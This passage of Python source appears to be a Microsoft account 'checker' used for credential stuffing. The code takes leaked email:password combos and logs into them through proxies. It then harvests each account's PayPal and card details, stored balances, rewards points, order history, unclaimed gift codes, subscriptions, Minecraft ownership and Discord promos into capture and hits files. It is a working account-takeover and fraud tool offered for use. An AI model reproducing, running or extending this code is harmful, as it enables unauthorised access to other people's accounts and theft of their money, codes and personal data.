    order = {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip,deflate,br', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Host': 'account.microsoft.com', 'MS-CV': 'XeULpZy1H023MIm9.7.51', 'Origin': 'https://login.live.com', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Sec-GPC': '1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': UA}
    xbox = {'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.7', 'Connection': 'keep-alive', 'Origin': 'https://www.xbox.com', 'Referer': 'https://www.xbox.com/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'Sec-GPC': '1', 'User-Agent': UA, 'content-type': 'application/json', 'x-xbl-contract-version': '1'}

    @staticmethod
    def update(header, dict2):
        header = header.copy()
        header.update(dict2)
        return header


def validate_gift_code(gift_code, session=None, proxy=None):
    """Validate if a Microsoft gift code is still valid/unclaimed."""
    result = {'valid': False, 'status': 'unknown', 'message': 'Unable to validate code'}
    try:
        s = session if session else requests.Session()
        proxies = parse_proxy(proxy) if proxy else None
        validation_url = 'https://redeem.microsoft.com/api/v1/code/validate'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Content-Type': 'application/json', 'Accept': 'application/json'}
        payload = {'code': gift_code, 'clientContext': {'client': 'Retail', 'deviceFamily': 'Windows.Desktop'}}
        response = s.post(validation_url, json=payload, headers=headers, proxies=proxies if isinstance(proxies, dict) and 'error' not in proxies else None, timeout=15, verify=False)
        if response.status_code == 200:
            data = response.json()
            if 'isValid' in data:
                if data.get('isValid'):
                    result['valid'] = True
                    result['status'] = 'valid'
                    result['message'] = 'Code is valid and unclaimed'
                    return result
                else:
                    result['valid'] = False
                    result['status'] = 'invalid'
                    error_code = data.get('errorCode', '')
                    if 'AlreadyRedeemed' in error_code or 'Claimed' in error_code:
                        result['message'] = 'Code has been claimed/redeemed'
                    elif 'Expired' in error_code:
                        result['message'] = 'Code has expired'
                    elif 'Invalid' in error_code:
                        result['message'] = 'Code is invalid'
                    else:
                        result['message'] = f'Code is not valid: {error_code}'
                    return result
            if 'productTitle' in data or 'title' in data:
                result['valid'] = True
                result['status'] = 'valid'
                result['message'] = f'Code is valid for: {data.get("productTitle") or data.get("title", "Unknown product")}'
                return result
        elif response.status_code == 400:
            result['valid'] = False
            result['status'] = 'invalid'
            result['message'] = 'Code format is invalid or already redeemed'
            return result
        elif response.status_code == 404:
            result['valid'] = False
            result['status'] = 'not_found'
            result['message'] = 'Code not found in system'
        else:
            result['message'] = f'Validation failed with status {response.status_code}'
        return result
    except requests.exceptions.Timeout:
        result['message'] = 'Validation request timed out'
    except requests.exceptions.RequestException as e:
        result['message'] = f'Network error: {str(e)[:50]}'
    except Exception as e:
        result['message'] = f'Error: {str(e)[:50]}'
    return result


def create_xbox_account_if_needed(s):
    """Create Xbox Live account if needed"""
    try:
        accountXbox = s.get('https://account.xbox.com/', headers=Headers.default, timeout=20).text
        if 'fmHF' in accountXbox:
            try:
                xbox_json = {
                    'fmHF': accountXbox.split('id="fmHF" action="')[1].split('"')[0],
                    'pprid': accountXbox.split('id="pprid" value="')[1].split('"')[0],
                    'nap': accountXbox.split('id="NAP" value="')[1].split('"')[0],
                    'anon': accountXbox.split('id="ANON" value="')[1].split('"')[0],
                    't': accountXbox.split('id="t" value="')[1].split('"')[0],
                }
                resp = s.post(xbox_json['fmHF'], timeout=20, headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA}, data={'pprid': xbox_json['pprid'], 'NAP': xbox_json['nap'], 'ANON': xbox_json['anon'], 't': xbox_json['t']})
                verifyToken = resp.text.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
                create_headers = {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://account.xbox.com', 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest', '__RequestVerificationToken': verifyToken}
                create_data = {'partnerOptInChoice': 'false', 'msftOptInChoice': 'false', 'isChild': 'true', 'returnUrl': 'https://www.xbox.com/en-US/?lc=1033'}
                s.post('https://account.xbox.com/en-us/xbox/account/api/v1/accountscreation/CreateXboxLiveAccount', headers=create_headers, data=create_data, timeout=20)
                time.sleep(0.5)
            except Exception:
                pass
    except Exception:
        pass


def get_xbl_authorization(s):
    """Get XBL 3.0 authorization token"""
    try:
        rel = s.get('https://account.xbox.com/en-us/auth/getTokensSilently?rp=http://xboxlive.com,http://mp.microsoft.com/,http://gssv.xboxlive.com/,rp://gswp.xboxlive.com/,http://sisu.xboxlive.com/', timeout=20).text
        json_obj = json.loads('{' + rel + '}')
        xbl_auth = 'XBL3.0 x=' + json_obj['userHash'] + ';' + json_obj['token']
        return xbl_auth
    except Exception:
        return None


def get_delegate_token(s):
    """Get MSADELEGATE OAuth token for payment API"""
    try:
        response = s.get('https://login.live.com/oauth20_authorize.srf', params={
            'client_id': '000000000004773A',
            'response_type': 'token',
            'scope': 'PIFD.Read PIFD.Create PIFD.Update PIFD.Delete',
            'redirect_uri': 'https://account.microsoft.com/auth/complete-silent-delegate-auth',
            'state': '{"userId":"bf3383c9b44aa8c9","scopeSet":"pidl"}',
            'prompt': 'none',
        }, headers={'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Referer': 'https://account.microsoft.com/'}, timeout=20, allow_redirects=True)
        if 'access_token=' in response.url:
            token = response.url.split('access_token=')[1].split('&')[0]
            return token
        return None
    except Exception:
        return None


def get_profile_info(s):
    """Get user profile information"""
    try:
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': UA}
        params = {'lang': 'en-GB'}
        response = s.get('https://account.microsoft.com/profile', params=params, headers=headers, timeout=20)
        try:
            vrf_token = response.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
        except:
            return None
        headers = {'Accept': 'application/json, text/plain, */*', 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest', '__RequestVerificationToken': vrf_token}
        response = s.get('https://account.microsoft.com/home/api/profile/personal-info', headers=headers, timeout=20)
        profile_data = response.json()
        return {
            'fullName': profile_data.get('fullName', ''),
            'countryCode': profile_data.get('countryCode', ''),
            'firstName': profile_data.get('firstName', ''),
            'lastName': profile_data.get('lastName', ''),
            'msaDisplayLanguage': profile_data.get('msaDisplayLanguage', ''),
            'msaPreferredLanguages': profile_data.get('msaPreferredLanguages', []),
            'raw': profile_data,
        }
    except Exception:
        return None


def get_active_subscriptions(s):
    """Get active Microsoft/Xbox subscriptions"""
    try:
        response = s.get('https://account.microsoft.com/services?lang=en-US', headers=Headers.payment, timeout=20)
        try:
            vrf_token = response.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
        except:
            return {}
        subs_headers = {'Accept': 'application/json, text/plain, */*', 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest', '__RequestVerificationToken': vrf_token, 'Referer': 'https://account.microsoft.com/services?lang=en-US'}
        r = s.get('https://account.microsoft.com/services/api/subscriptions-and-alerts?excludeWindowsStoreInstallOptions=false&excludeLegacySubscriptions=false', headers=subs_headers, timeout=20)
        d = r.json()
        if len(d.get('active', [])) == 0:
            return {}
        subs = {}
        for sub in d['active']:
            for item in sub.get('payNow', {}).get('items', []):
                sub_name = item.get('name', 'Unknown')
                start_date = 'Unknown'
                if sub.get('productRenewal'):
                    start_date = sub['productRenewal'].get('startDateShortString', 'Unknown')
                subs[sub_name] = start_date
        return subs
    except Exception:
        return {}


def get_payment_methods(s, combo):
    """Get payment methods including PayPal, cards, and stored value instruments"""
    global ms_cards_count, ms_paypal_count, ms_balance_count
    getpm = None
    auth_method = 'NONE'

    delegate_token = get_delegate_token(s)
    if delegate_token:
        payment_headers = {'Authorization': f'MSADELEGATE1.0="{delegate_token}"', 'Accept': 'application/json', 'User-Agent': UA, 'Content-Type': 'application/json', 'Origin': 'https://account.microsoft.com', 'Referer': 'https://account.microsoft.com/'}
        try:
            response = requests.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US', headers=payment_headers, timeout=20)
            if response.status_code == 200:
                getpm = response.json()
                auth_method = 'DELEGATE'
        except Exception:
            pass

    if not getpm:
        create_xbox_account_if_needed(s)
        xbl3 = get_xbl_authorization(s)
        if xbl3:
            payment_headers = {'authorization': xbl3, 'Accept': 'application/json', 'User-Agent': UA}
            try:
                response = requests.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US&partner=webblends', headers=payment_headers, timeout=20)
                if response.status_code == 200:
                    getpm = response.json()
                    auth_method = 'XBL3'
            except Exception:
                pass

    if not getpm:
        return None

    profile_info = get_profile_info(s)
    payment_info = {'paypal': None, 'cards': [], 'stored_value': [], 'total_balance': 0.0, 'currencies': [], 'auth_method': auth_method, 'profile': profile_info}

    for pm in getpm:
        if not isinstance(pm, dict):
            continue
        details = pm.get('details', {})
        if not isinstance(details, dict):
            continue
        balance = details.get('balance', 0.0)
        currency = details.get('currency', None)
        try:
            balance = float(balance) if balance else 0.0
        except:
            balance = 0.0

        pm_type = pm.get('paymentMethod', {}).get('paymentMethodType', '')
        pm_family = pm.get('paymentMethod', {}).get('paymentMethodFamily', '')
        pm_status = pm.get('status', '')

        # PayPal
        if pm_type == 'paypal' and pm_status == 'Active' and not payment_info['paypal']:
            payment_info['paypal'] = {'email': details.get('email', 'Unknown'), 'balance': balance, 'status': pm_status}
            with lock:
                ms_paypal_count += 1
            os.makedirs('capture', exist_ok=True)
            write_to_file_no_duplicates('capture/paypal.txt', f'{combo} | PayPal Email: {details.get("email", "Unknown")} | Balance: {balance}')

        # Credit cards
        if pm_family == 'credit_card' and pm_status == 'Active':
            address = details.get('address', {})
            card_info = {
                'holder_name': details.get('accountHolderName', 'Unknown'),
                'card_type': details.get('cardType', 'Unknown'),
                'card_brand': pm.get('paymentMethod', {}).get('display', {}).get('name', 'Unknown'),
                'last_four': details.get('lastFourDigits', '****'),
                'expiry_month': details.get('expiryMonth', 'Unknown'),
                'expiry_year': details.get('expiryYear', 'Unknown'),
                'is_valid': details.get('isValid', False),
                'is_expired': details.get('is_expired', ''),
                'city': address.get('city', '') if isinstance(address, dict) else '',
                'country': address.get('country', 'Unknown') if isinstance(address, dict) else 'Unknown',
            }
            payment_info['cards'].append(card_info)
            with lock:
                ms_cards_count += 1
            os.makedirs('capture', exist_ok=True)
            write_to_file_no_duplicates('capture/cards.txt', f'{combo} | {card_info["card_type"]} ****{card_info["last_four"]} | Exp: {card_info["expiry_month"]}/{card_info["expiry_year"]}')

        # Stored value / balance
        if balance > 0:
            payment_info['total_balance'] += balance
            if currency and currency not in payment_info['currencies']:
                payment_info['currencies'].append(currency)
            locale = 'en-US'
            market = 'US'
            if profile_info:
                locale = profile_info.get('msaDisplayLanguage', 'en-US') or 'en-US'
                if not locale and profile_info.get('msaPreferredLanguages'):
                    locale = profile_info['msaPreferredLanguages'][0]
                market = locale.split('-')[-1] if '-' in locale else 'US'
            stored_val_info = {'id': pm['id'], 'balance': balance, 'currency': currency, 'market': market, 'locale': locale, 'extra': pm}
            payment_info['stored_value'].append(stored_val_info)
            with lock:
                ms_balance_count += 1
            os.makedirs('capture', exist_ok=True)
            write_to_file_no_duplicates('capture/balance.txt', f'{combo} | Balance: {balance} {currency}')

    return payment_info


def get_rewards_points(s, combo, vrf_token):
    """Get Microsoft Rewards points balance via rewards.bing.com"""
    global ms_rewards_count, ms_total_rewards_points
    try:
        # Primary: Scrape rewards.bing.com dashboard page
        # The session cookies from login.live.com auth flow carry over to bing.com
        rewards_headers = {
            'User-Agent': UA,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
        }
        response = s.get('https://rewards.bing.com/', headers=rewards_headers, timeout=20)
        if response.status_code == 200:
            text = response.text
            points_balance = 0
            lifetime_points = 0

            # Extract availablePoints from dashboard JSON embedded in page
            ap_match = re.search(r'"availablePoints"\s*:\s*(\d+)', text)
            if ap_match:
                points_balance = int(ap_match.group(1))

            # Extract lifetimePoints
            lp_match = re.search(r'"lifetimePoints"\s*:\s*(\d+)', text)
            if lp_match:
                lifetime_points = int(lp_match.group(1))

            if points_balance > 0:
                with lock:
                    ms_rewards_count += 1
                    ms_total_rewards_points += points_balance
                os.makedirs('capture', exist_ok=True)
                reward_line = f'{combo} | Rewards Points: {points_balance:,}'
                if lifetime_points > 0:
                    reward_line += f' | Lifetime: {lifetime_points:,}'
                write_to_file_no_duplicates('capture/rewards.txt', reward_line)
                return {'balance': points_balance, 'lifetime': lifetime_points}

        # Fallback: Try the getuserinfo API
        try:
            api_response = s.get('https://rewards.bing.com/api/getuserinfo?type=1', headers={
                'User-Agent': UA,
                'Accept': 'application/json',
            }, timeout=15)
            if api_response.status_code == 200:
                data = api_response.json()
                dashboard = data.get('dashboard', {})
                user_status = dashboard.get('userStatus', {})
                points_balance = user_status.get('availablePoints', 0)
                lifetime_points = user_status.get('lifetimePoints', 0)
                if points_balance > 0:
                    with lock:
                        ms_rewards_count += 1
                        ms_total_rewards_points += points_balance
                    os.makedirs('capture', exist_ok=True)
                    reward_line = f'{combo} | Rewards Points: {points_balance:,}'
                    if lifetime_points > 0:
                        reward_line += f' | Lifetime: {lifetime_points:,}'
                    write_to_file_no_duplicates('capture/rewards.txt', reward_line)
                    return {'balance': points_balance, 'lifetime': lifetime_points}
        except Exception:
            pass

    except Exception:
        pass
    return None


def get_transaction_history(s, combo):
    """Get payment transaction history"""
    try:
        delegate_token = get_delegate_token(s)
        if not delegate_token:
            return None
        headers = {'Authorization': f'MSADELEGATE1.0="{delegate_token}"', 'Accept': 'application/json', 'User-Agent': UA}
        response = requests.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions', headers=headers, timeout=20)
        if response.status_code != 200:
            return None
        data = response.json()
        transactions = {'orders': [], 'subscriptions': []}
        for order in data.get('orders', []):
            order_info = {'title': order.get('title', 'Unknown'), 'description': order.get('description', ''), 'quantity': order.get('quantity', 1), 'currency': order.get('currency', 'USD'), 'total_amount': order.get('totalAmount', 0), 'product_type': order.get('productType', 'Unknown'), 'date': order.get('orderDate', 'Unknown')}
            transactions['orders'].append(order_info)
        for sub in data.get('subscriptions', []):
            sub_info = {'title': sub.get('title', 'Unknown'), 'description': sub.get('description', ''), 'quantity': sub.get('quantity', 1), 'currency': sub.get('currency', 'USD'), 'total_amount': sub.get('totalAmount', 0), 'product_type': sub.get('productType', 'Unknown'), 'status': sub.get('status', 'Unknown')}
            if sub_info['product_type'] == 'PASS':
                sub_info['product_type_display'] = 'XBOX GAME PASS'
            elif sub_info['product_type'] == 'GOLD':
                sub_info['product_type_display'] = 'XBOX GOLD'
            else:
                sub_info['product_type_display'] = sub_info['product_type']
            transactions['subscriptions'].append(sub_info)
        return transactions
    except Exception:
        return None


def fetch_discord_promo(s, combo, xbl3_auth):
    """Fetch Discord Nitro promo from Xbox Game Pass perks"""
    try:
        # Try v3 first, fall back to v2 for the Discord Nitro offer
        nitro_offer_id = 'A3525E6D4370403B9763BCFA97D383D9'
        data = None
        for ver in ('v3', 'v2'):
            try:
                response = s.post(f'https://profile.gamepass.com/{ver}/offers/{nitro_offer_id}/', headers={'authorization': xbl3_auth, 'User-Agent': UA}, timeout=20)
                if response.status_code == 200:
                    data = response.json()
                    break
            except Exception:
                continue
        if not data:
            return None
        link = data.get('resource') or data.get('code') or data.get('redemptionUrl')
        if not link:
            return None
        code = link.split('/')[-1]
        try:
            discord_check = requests.get(f'https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true', timeout=20)
            if discord_check.status_code == 200:
                discord_data = discord_check.json()
                uses = discord_data.get('uses', 0)
                if uses == 1:
                    return {'status': 'claimed', 'link': link, 'code': code, 'days_left': 'N/A'}
                return {'status': 'unclaimed', 'link': link, 'code': code, 'days_left': 'N/A'}
        except Exception:
            pass
        return {'status': 'unclaimed', 'link': link, 'code': code, 'days_left': 'Unknown'}
    except Exception:
        return None


def check_microsoft_account(combo, proxy=None, enable_minecraft=False, enable_full_capture=False, enable_promo_puller=False):
    """Main Microsoft account checker function"""
    global ms_checked_count, ms_minecraft_count, ms_codes_count, ms_subscriptions_count, ms_codes_valid_count, ms_refundable_count, ms_promo_count

    if cancel_event.is_set():
        return None

    try:
        email, password = combo.strip().split(':', 1)
    except ValueError:
        with lock:
            ms_errors.append(combo)
            ms_captures.append({'combo': combo, 'status': 'ERROR', 'details': 'Invalid format'})
            ms_checked_count += 1
        return None

    s = requests.session()
    s.verify = False

    if proxy:
        parsed_proxy = parse_proxy(proxy)
        if 'error' not in parsed_proxy:
            proxy_url = 'http://'
            if parsed_proxy.get('user') and parsed_proxy.get('pass'):
                proxy_url += f'{parsed_proxy["user"]}:{parsed_proxy["pass"]}@'
            proxy_url += f'{parsed_proxy["host"]}:{parsed_proxy["port"]}'
            s.proxies = {'http': proxy_url, 'https': proxy_url}

    try:
        response = s.get('https://login.live.com/ppsecure/post.srf', headers=Headers.default, timeout=20)
        response_text = response.text

        # Extract PPFT and urlPost
        ppft = None
        log_url = None
        serverdata_match = re.search(r'var ServerData = ({.*?});', response_text, re.DOTALL)
        if serverdata_match:
            try:
                server_data = json.loads(serverdata_match.group(1))
                if 'sFTTag' in server_data:
                    ftag = server_data['sFTTag']
                    ppft_match = re.search(r'value="([^"]+)"', ftag)
                    if ppft_match:
                        ppft = ppft_match.group(1)
                if 'urlPost' in server_data:
                    log_url = server_data['urlPost']
            except json.JSONDecodeError:
                pass

        if not ppft:
            ppft_match = re.search(r'"sFTTag":"[^"]*value=\\"([^"\\]+)\\"', response_text)
            if ppft_match:
                ppft = ppft_match.group(1)
        if not log_url:
            urlpost_match = re.search(r'"urlPost":"([^"]+)"', response_text)
            if urlpost_match:
                log_url = urlpost_match.group(1)
        if not ppft or not log_url:
            try:
                if not ppft:
                    ppft = response_text.split('<input type="hidden" name="PPFT" id="i0327" value="')[1].split('"')[0]
                if not log_url:
                    log_url = response_text.split(",urlPost:'")[1].split("'")[0]
            except:
                with lock:
                    ms_dead.append(combo)
                    ms_captures.append({'combo': combo, 'status': 'DEAD'})
                    ms_checked_count += 1
                return

        # POST login
        log_data = f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894'
        try:
            response = s.post(log_url, timeout=20, data=log_data, headers=Headers.login)
        except request_exceptions:
            with lock:
                ms_dead.append(combo)
                ms_captures.append({'combo': combo, 'status': 'DEAD'})
                ms_checked_count += 1
            return

        # Check 2FA
        if any(value in response.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
            with lock:
                ms_errors.append(combo)
                ms_captures.append({'combo': combo, 'status': '2FA'})
                ms_checked_count += 1
            return

        # Check dead
        if any(value in response.text.lower() for value in ['password is incorrect', "account doesn't exist.", 'sign in to your microsoft account', 'tried to sign in too many times']):
            with lock:
                ms_dead.append(combo)
                ms_captures.append({'combo': combo, 'status': 'DEAD'})
                ms_checked_count += 1
            return

        # Handle proofs/Add
        if 'https://account.live.com/proofs/Add' in response.text:
            try:
                ipt = response.text.split('id="ipt" value="')[1].split('"')[0]
                pprid = response.text.split('id="pprid" value="')[1].split('"')[0]
                uaid = response.text.split('id="uaid" value="')[1].split('"')[0]
                data = f'ipt={ipt}&pprid={pprid}&uaid={uaid}'
                fmHf = response.text.split('id="fmHF" action="')[1].split('"')[0]
                response = s.post(fmHf, data=data, headers=Headers.midauth)
                canary = response.text.split('id="canary" name="canary" value="')[1].split('"')[0]
                data = {'iProofOptions': 'Email', 'DisplayPhoneCountryISO': 'US', 'DisplayPhoneNumber': '', 'EmailAddress': '', 'canary': canary, 'action': 'Skip', 'PhoneNumber': '', 'PhoneCountryISO': ''}
                response = s.post(response.text.split('id="frmAddProof" method="post" action="')[1].split('"')[0], headers=Headers.midauth, data=data)
            except Exception:
                pass

        # Handle privacy notice
        if 'https://privacynotice.account.microsoft.com/notice' in response.text:
            try:
                privNotifUrl = response.text.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]
                corelationId = response.text.split('name="correlation_id" id="correlation_id" value="')[1].split('"')[0]
                mCode = response.text.split('type="hidden" name="code" id="code" value="')[1].split('"')[0]
                privNotifPage = s.post(privNotifUrl, headers=Headers.update(Headers.privacy, {'path': privNotifUrl.replace('https://privacynotice.account.microsoft.com', '')}), data={'correlation_id': corelationId, 'code': mCode}).text
                if MultipartEncoder:
                    m = MultipartEncoder({
                        'AppName': 'ALC',
                        'ClientId': privNotifPage.split("ucis.ClientId = '")[1].split("'")[0],
                        'ConsentSurface': 'SISU',
                        'ConsentType': 'ucsisunotice',
                        'correlation_id': corelationId,
                        'CountryRegion': privNotifPage.split("ucis.CountryRegion = '")[1].split("'")[0],
                        'DeviceId': '',
                        'EncryptedRequestPayload': privNotifPage.split("ucis.EncryptedRequestPayload = '")[1].split("'")[0],
                        'FormFactor': 'Desktop',
                        'InitVector': privNotifPage.split("ucis.InitVector = '")[1].split("'")[0],
                        'Market': privNotifPage.split("ucis.Market = '")[1].split("'")[0],
                        'UserId': privNotifPage.split("ucis.UserId = '")[1].split("'")[0],
                        'UserVersion': '1',
                    })
                    s.post('https://privacynotice.account.microsoft.com/recordnotice', headers=Headers.update(Headers.precord, {'referer': privNotifUrl, 'content-type': m.content_type}), data=m)
                if 'notice?ru=' in privNotifUrl:
                    ru = urllib.parse.unquote(privNotifUrl.split('notice?ru=')[1])
                    response = s.get(ru, headers=Headers.notice)
            except Exception:
                pass

        # Handle fmHF redirect
        url_log2 = None
        url_match = re.findall(r"urlPost:'(.+?(?='))", response.text)
        if url_match:
            url_log2 = url_match[0]
        if not url_log2:
            json_match = re.search(r'"urlPost":"([^"]+)"', response.text)
            url_log2 = json_match.group(1) if json_match else None

        if url_log2:
            log_data2 = {'LoginOptions': '3', 'type': '28', 'ctx': '', 'hpgrequestid': '', 'PPFT': ppft, 'i19': '19130'}
            try:
                midAuth2 = s.post(url_log2, timeout=20, data=log_data2, headers=Headers.update(Headers.midauth, {'Referer': log_url})).text
            except request_exceptions:
                with lock:
                    ms_dead.append(combo)
                    ms_captures.append({'combo': combo, 'status': 'DEAD'})
                    ms_checked_count += 1
                return
        else:
            midAuth2 = response.text

        if 'fmHF' in midAuth2:
            try:
                fmHF_url = midAuth2.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]
                pprid = midAuth2.split('type="hidden" name="pprid" id="pprid" value="')[1].split('"')[0]
                nap = midAuth2.split('type="hidden" name="NAP" id="NAP" value="')[1].split('"')[0]
                anon = midAuth2.split('type="hidden" name="ANON" id="ANON" value="')[1].split('"')[0]
                t = midAuth2.split('<input type="hidden" name="t" id="t" value="')[1].split('"')[0]
                data = {'pprid': pprid, 'NAP': nap, 'ANON': anon, 't': t}
                midAuth2 = s.post(fmHF_url, data=data, headers=Headers.midauth2).text
            except Exception:
                pass

        # Get billing page
        try:
            params = {'fref': 'home.drawers.payment-options.manage-payment', 'refd': 'account.microsoft.com'}
            response = s.get('https://account.microsoft.com/billing/payments', params=params, headers=Headers.payment)
            vrf_token = response.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
        except Exception:
            with lock:
                ms_valid.append(combo)
                capture_data = {'combo': combo, 'status': 'VALID', 'orders': 0, 'xbox': 'No', 'minecraft': 'N/A', 'refundable': 0}
                ms_captures.append(capture_data)
                ms_checked_count += 1
            return

        with lock:
            ms_valid.append(combo)

        # Full capture
        profile_info = None
        payment_info = None
        rewards_info = None
        transaction_info = None
        if enable_full_capture:
            os.makedirs('capture', exist_ok=True)
            profile_info = get_profile_info(s)
            if profile_info:
                profile_text = f'{combo} | '
                if profile_info.get('fullName'):
                    profile_text += f'Name: {profile_info["fullName"]} | '
                if profile_info.get('countryCode'):
                    profile_text += f'Country: {profile_info["countryCode"]}'
                if profile_info.get('fullName') or profile_info.get('countryCode'):
                    write_to_file_no_duplicates('capture/profile_info.txt', profile_text)
            payment_info = get_payment_methods(s, combo)
            rewards_info = get_rewards_points(s, combo, vrf_token)
            transaction_info = get_transaction_history(s, combo)

        # Get orders
        orders_count = 0
        has_xbox = False
        has_minecraft_order = False
        refundable_count = 0
        gift_codes_count = 0
        user_market = None
        specific_folder = 'specific'
        activesubs_folder = 'activesubs'
        os.makedirs(specific_folder, exist_ok=True)
        os.makedirs(activesubs_folder, exist_ok=True)

        try:
            params = {'period': 'AllTime', 'orderTypeFilter': 'All', 'filterChangeCount': '0', 'isInD365Orders': True, 'isPiDetailsRequired': True, 'timeZoneOffsetMinutes': '-330'}
            json_data = s.get('https://account.microsoft.com/billing/orders/list', params=params, headers=Headers.update(Headers.order, {'Referer': response.url, '__RequestVerificationToken': vrf_token})).json()
            total_orders = json_data.get('orders', [])
            orders_count = len(total_orders)
            if total_orders and not user_market:
                try:
                    user_market = total_orders[0].get('userMarket', None)
                except:
                    pass

            for order in total_orders:
                for item in order.get('items', []):
                    order_name = item.get('localTitle', '')
                    order_status = item.get('itemState', 'Physical')

                    # Check refundable
                    has_ms_account = False
                    for p in order.get('paymentInstruments', []):
                        payment_name = p.get('localName', p.get('id', '')).lower()
                        payment_type = p.get('paymentType', '').lower()
                        if 'microsoft' in payment_name or 'account' in payment_name:
                            has_ms_account = True
                            break
                        if any(keyword in payment_type for keyword in ['account', 'stored_value', 'balance']):
                            has_ms_account = True
                            break
                    if has_ms_account and item.get('isRefundEligible', False):
                        refundable_count += 1

                    # Save to specific folder
                    if order_status.lower() not in ['cancelled', 'pending', 'failed', 'giftredeemed', 'authorizationfailed', 'refunded', 'canceled', 'giftsent', 'chargeback', 'physical'] and order_name:
                        safe_name = order_name.replace('/', '.').replace('\\', '.')
                        specific_file = os.path.join(specific_folder, f'{safe_name}.txt')
                        write_to_file_no_duplicates(specific_file, combo)

                    # Gift codes
                    if 'GiftSent' in order_status:
                        gift_code = item.get('giftCode', None)
                        if gift_code:
                            ip_region = order.get('address', {}).get('regionName', 'Unknown')
                            validation_result = validate_gift_code(gift_code, session=s, proxy=SETTINGS.get('proxy'))
                            status_indicator = '✓ VALID' if validation_result['valid'] else '✗ CLAIMED/INVALID'
                            write_to_file_no_duplicates('codes.txt', f'{gift_code} : {ip_region} : {order_name} [{status_indicator}]')
                            with lock:
                                ms_codes_count += 1
                            gift_codes_count += 1
                            if validation_result['valid']:
                                with lock:
                                    ms_codes_valid_count += 1

                    if 'Game Pass' in order_name or 'Xbox' in order_name:
                        has_xbox = True
                    if 'Minecraft' in order_name:
                        has_minecraft_order = True
        except Exception:
            pass

        # Active subscriptions
        try:
            active_subs_dict = get_active_subscriptions(s)
            if active_subs_dict:
                with lock:
                    ms_subscriptions_count += len(active_subs_dict)
                for sub_name, start_date in active_subs_dict.items():
                    safe_sub_name = sub_name.replace('/', '.').replace('\\', '.')
                    activesub_file = os.path.join(activesubs_folder, f'{safe_sub_name}.txt')
                    write_to_file_no_duplicates(activesub_file, f'{combo} | Active till: {start_date}')
                    if 'game pass' in sub_name.lower():
                        has_xbox = True
        except Exception:
            pass

        # Minecraft check
        minecraft_status = 'N/A'
        minecraft_data = None
        if enable_minecraft:
            try:
                minecraft_data = check_minecraft_detailed(email, password, combo)
                if minecraft_data:
                    minecraft_status = f'Yes ({minecraft_data["username"]})'
                    with lock:
                        ms_minecraft_count += 1
                    write_to_file_no_duplicates('minecraft.txt', combo)
                else:
                    minecraft_status = 'No'
            except Exception:
                minecraft_status = 'Error'

        # Promo puller
        if enable_promo_puller:
            try:
                create_xbox_account_if_needed(s)
                xbl3_auth = get_xbl_authorization(s)
                if xbl3_auth:
                    promo_data = fetch_discord_promo(s, combo, xbl3_auth)
                    if promo_data:
                        status = promo_data.get('status')
                        link = promo_data.get('link')
                        days_left = promo_data.get('days_left', 'N/A')
                        if status == 'unclaimed':
                            with lock:
                                ms_promo_count += 1
                            os.makedirs('promos', exist_ok=True)
                            write_to_file_no_duplicates('promos/unclaimed.txt', f'{combo} | {link} | Days Left: {days_left}')
                        elif status == 'claimed':
                            os.makedirs('promos', exist_ok=True)
                            write_to_file_no_duplicates('promos/claimed.txt', f'{combo} | {link} | Days Left: {days_left}')
            except Exception:
                pass

        # Save results
        with lock:
            if orders_count > 0:
                ms_hits.append(combo)
                capture_data = {'combo': combo, 'status': 'HIT', 'orders': orders_count, 'xbox': 'Yes' if has_xbox else 'No', 'minecraft': minecraft_status, 'minecraft_data': minecraft_data, 'refundable': refundable_count, 'gift_codes': gift_codes_count, 'payment_info': payment_info, 'profile_info': profile_info, 'user_market': user_market, 'transaction_info': transaction_info}
                ms_captures.append(capture_data)
                write_to_file_no_duplicates('hits.txt', combo)
                if live_save_folder:
                    hit_details = f'{combo} | Orders={orders_count} | Xbox={"Yes" if has_xbox else "No"} | Minecraft={minecraft_status}'
                    if user_market:
